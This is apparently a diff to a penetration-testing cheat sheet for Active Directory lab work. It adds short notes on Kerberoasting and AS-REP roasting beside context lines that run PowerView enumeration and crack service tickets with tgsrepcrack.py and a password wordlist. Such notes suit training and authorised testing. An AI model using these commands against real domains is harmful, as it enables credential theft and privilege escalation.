@@ -740,6 +740,7 @@ Get-RemoteCachedCredential -Computername dcorp-dc -Verbose
 ```
 # Domain Privilege escalation
 ## Kerberoast
+Roast service accounts which are users, passwords set manually. Might be able to crack.
 #### Find user accounts used as service accounts
 ```
 Get-NetUser -SPN
@@ -770,6 +771,7 @@ python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~
 ```
 
 ## AS-REPS Roasting
+Roast user account wich don't require pre authentication
 #### Enumerating accounts with kerberos preauth disabled
 ```
 . .\Powerview_dev.ps1
